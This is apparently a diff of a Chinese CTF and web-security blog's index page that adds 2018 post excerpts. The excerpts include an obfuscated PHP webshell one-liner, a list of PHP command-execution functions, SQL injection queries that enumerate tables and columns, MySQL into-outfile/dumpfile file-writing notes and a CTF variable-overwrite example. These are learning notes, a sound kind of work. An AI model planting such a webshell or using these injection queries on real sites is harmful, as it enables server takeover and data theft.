@@ -339,6 +339,117 @@
     
     
     <article class="index-post">
+        <a class="abstract-title" href = "/posts/5109/" >
+            
+                <span>php-命令执行</span>
+        </a>
+        <div class="abstract-content">
+            
+webshell
+
+123456&lt;?=$_="`&#123;&#123;&#123;"^"?&lt;&gt;/";$&#123;$_&#125;[_]($&#123;$_&#125;[__]);=&gt; $_GET[_]($_GET[__]);=&gt;&lt;?=`&#123;$&#123;~"����"&#125;[_]&#125;`;// echo -ne '&lt;?=`&#123;$&#123;~"\xa0\xb8\xba\xab"&#125;[_]&#125;`;'
+
+写文件&amp;读文件
+
+php的标签&lt;?php存在字母肯定不行，尝试&lt;?发现不解析，...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/07/18</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "web安全">web安全</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/posts/45992/" >
+            
+                <span>php命令执行函数</span>
+        </a>
+        <div class="abstract-content">
+            代码或命令执行函数：
+
+system                    允许执行一个外部程序并回显输出，类似于 passthru() 
+shell_exec
+exec                        允许执行一个外部程序 
+curl_exec
+popen               可通过 popen() 的参数传递一条命令，并对 popen() 所打开的文件进行执行。
+proc_open               执行一个命令并打开文件指针用于读取以及写入 
+passthru                   允许执行一个外部程序并回显输出 
+pcntl_exec...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/07/15</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "web安全">web安全</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/posts/16486/" >
+            
+                <span>web安全备忘录</span>
+        </a>
+        <div class="abstract-content">
+            dumpfile和outfile的区别SELECT into outfile: 导出到一个txt文件，可以导出每行记录的，这个很适合导库
+SELECT into dump: 只能导出一行数据
+如果想把一个可执行二进制文件用into outfile函数导出，导出后，文件会被破坏
+因为into outfile函数会在行末端写新行，更致使的是会转义换行符，这样2进制可执行文件就会被破坏
+这时，我们能用into dumpfile导出一个完整能执行的2进制文件，它不对任何列或行进行终止，也不执行任何转义处理
+总结：
+into outfile:导出内容
+into dumpfile:导出二进制文件
+....
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/06/30</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "web安全">web安全</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href = "/posts/5359/" >
             
                 <span>sqlmap使用</span>
@@ -386,6 +497,35 @@ po...
     
     
     <article class="index-post">
+        <a class="abstract-title" href = "/posts/23527/" >
+            
+                <span>phpinfo解读</span>
+        </a>
+        <div class="abstract-content">
+            <h1 id="phpinfo解读"><a href="#phpinfo解读" class="headerlink" title="phpinfo解读"></a>phpinfo解读</h1>
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/05/22</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "web安全">web安全</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href = "/posts/62655/" >
             
                 <span>cbc翻转</span>
@@ -402,6 +542,112 @@ http://wooyun.jozxing.cc/static/drops/tips-7828.html
             <!-- date  -->
             <div class="abstract-date">
                 <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/05/08</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "web安全">web安全</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/posts/15636/" >
+            
+                <span>parse_url + curl</span>
+        </a>
+        <div class="abstract-content">
+            parse_url + curlLet’s open the URL and prod around. We find a search box, which can retrieve the source code of any page on https://www.google.com.
+
+Different hostnames are all blocked. Examples are:
+evil.com 
+hostnames that include www.google.com such as www.google.com.evil.com 
+URLs that includ...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/04/24</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "web安全">web安全</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/posts/65402/" >
+            
+                <span>PHP代码审计归纳</span>
+        </a>
+        <div class="abstract-content">
+            <h1 id="PHP代码审计归纳"><a href="#PHP代码审计归纳" class="headerlink" title="PHP代码审计归纳"></a>PHP代码审计归纳</h1><p>Author: 木禾 ali0th</p>
+<p><a href="https://github.com/Martin2877/Ali0thNotes/blob/master/Code%20Audit/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%BD%92%E7%BA%B3.md" target="_blank" rel="noopener">https://github.com/Martin2877/Ali0thNotes/blob/master/Code%20Audit/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%BD%92%E7%BA%B3.md</a></p>
+<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><h3 id="extract"><a href="#extract" class="headerlink" title="extract()"></a>extract()</h3><p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。条件：若有EXTR_SKIP则不行。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"Original"</span>;</span><br><span class="line">$my_array = <span class="keyword">array</span>(<span class="string">"a"</span> =&gt; <span class="string">"Cat"</span>,<span class="string">"b"</span> =&gt; <span class="string">"Dog"</span>, <span class="string">"c"</span> =&gt; <span class="string">"Horse"</span>);</span><br><span class="line">extract($my_array); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\$a = $a; \$b = $b; \$c = $c"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 结果：$a = Cat; $b = Dog; $c = Horse</span></span><br></pre></td></tr></table></figure></p>
+<p>这里原来是\$a是original，后面通过extract把$a覆盖变成了Cat了,所以这里把原来的变量给覆盖了。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#?shiyan=&amp;flag=1</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">'xxx'</span>; </span><br><span class="line">extract($_GET);</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>($shiyan))</span><br><span class="line"> &#123; </span><br><span class="line">    $content=trim(file_get_contents($flag)); <span class="comment"># content is 0 , flag can be anything,cause file_get_contents cannot open file, return 0</span></span><br><span class="line">    <span class="keyword">if</span>($shiyan==$content)</span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'ctf&#123;xxx&#125;'</span>; </span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123; </span><br><span class="line">    <span class="keyword">echo</span><span class="string">'Oh.no'</span>;</span><br><span class="line">   &#125; </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/04/18</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "web安全">web安全</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/posts/41083/" >
+            
+                <span>sql注入大全</span>
+        </a>
+        <div class="abstract-content">
+            
+表名
+1select group_concat(distinct table_name) from information_schema.tables where table_schema=database()
+
+列名
+1select group_concat(distinct column_name) from information_schema.columns where table_name=[16进制|`table_name`]
+
+数据库
+1select group_concat(schema_name) from information_schema.schemata
+
+表...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/03/21</span>
             </div>
             <!-- tags  -->
             
@@ -1023,9 +1269,49 @@ http://wooyun.jozxing.cc/static/drops/tips-7828.html
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 38
+        Total : 40
         </div>
         <!-- search  -->
         
@@ -1038,6 +1324,16 @@ http://wooyun.jozxing.cc/static/drops/tips-7828.html
     
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href= "/posts/41139/" >how2heap-分析总结（一）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href= "/posts/27029/" >0ctf2018-babyheap</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1121,12 +1417,12 @@ http://wooyun.jozxing.cc/static/drops/tips-7828.html
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/08</span><a class="archive-post-title" href= "/posts/5359/" >sqlmap使用</a>
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href= "/posts/29112/" >pwn前置知识</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/08</span><a class="archive-post-title" href= "/posts/29112/" >pwn前置知识</a>
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href= "/posts/5359/" >sqlmap使用</a>
         </li>
     
     
@@ -1161,12 +1457,12 @@ http://wooyun.jozxing.cc/static/drops/tips-7828.html
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/22</span><a class="archive-post-title" href= "/posts/9764/" >rctf2018学习笔记</a>
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href= "/posts/23527/" >phpinfo解读</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/22</span><a class="archive-post-title" href= "/posts/23527/" >phpinfo解读</a>
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href= "/posts/9764/" >rctf2018学习笔记</a>
         </li>
     
     
@@ -1234,9 +1530,9 @@ http://wooyun.jozxing.cc/static/drops/tips-7828.html
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
-    
         <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
     
         <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
     
@@ -1244,15 +1540,13 @@ http://wooyun.jozxing.cc/static/drops/tips-7828.html
     
         <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
     
-        <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
-    
         <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
     
-        <span class="sidebar-tag-name" data-tags="安全"><span class="iconfont-archer">&#xe606;</span>安全</span>
-    
-        <span class="sidebar-tag-name" data-tags="sql注入"><span class="iconfont-archer">&#xe606;</span>sql注入</span>
+        <span class="sidebar-tag-name" data-tags="python安全"><span class="iconfont-archer">&#xe606;</span>python安全</span>
     
         <span class="sidebar-tag-name" data-tags="前端"><span class="iconfont-archer">&#xe606;</span>前端</span>
+    
+        <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
@@ -1288,8 +1582,6 @@ jsonContent:
     <div class="sidebar-categories-name">
     
         <span class="sidebar-category-name" data-categories="安全"><span class="iconfont-archer">&#xe60a;</span>安全</span>
-    
-        <span class="sidebar-category-name" data-categories="安全/sql注入"><span class="iconfont-archer">&#xe60a;</span>安全/sql注入</span>
     
     </div>
     <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
